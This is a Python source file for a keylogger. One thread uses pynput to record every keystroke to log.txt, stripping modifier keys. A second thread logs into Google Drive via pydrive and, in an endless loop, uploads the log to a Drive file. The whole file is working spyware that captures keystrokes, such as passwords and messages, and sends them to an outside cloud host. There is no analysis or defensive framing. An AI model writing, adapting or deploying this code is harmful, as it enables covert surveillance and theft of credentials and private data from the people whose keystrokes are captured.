from pynput.keyboard import Listener
from threading import *
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

class KeyLogger(Thread):

    def run(self):

        def keyLogger(key):
            letter = str(key)
            #letter = letter.decode('utf-8')
            if letter[0] == 'u':
                letter = letter[2]

            if letter == 'Key.space':
                letter = ' '
            if letter == 'Key.cmd':
                letter = ''
            if letter == 'Key.shift':
                letter = ''
            if letter == "Key.ctrl":
                letter = ''
            if letter == "Key.caps_lock":
                letter = ''
            if letter == "Key.alt_l":
                letter = ''
            if letter == "Key.alt_R":
                letter = ''
            if letter == "Key.enter":
                letter = "\n"


            with open('log.txt','a+') as f:
                f.write(letter)


        with Listener(on_press=keyLogger) as l:
            l.join()

class Gdrive(Thread):
    def run(self):

        gauth = GoogleAuth()
        gauth.LocalWebserverAuth()

        drive = GoogleDrive(gauth)
        file1 = drive.CreateFile({'title': 'log.txt'})  # Create GoogleDriveFile instance with title 'log.txt'.
        while True:
            with open('log.txt') as f:
                fp = f.read()
            file1.SetContentString(fp)  # Set content of the file from given string.
            file1.Upload()
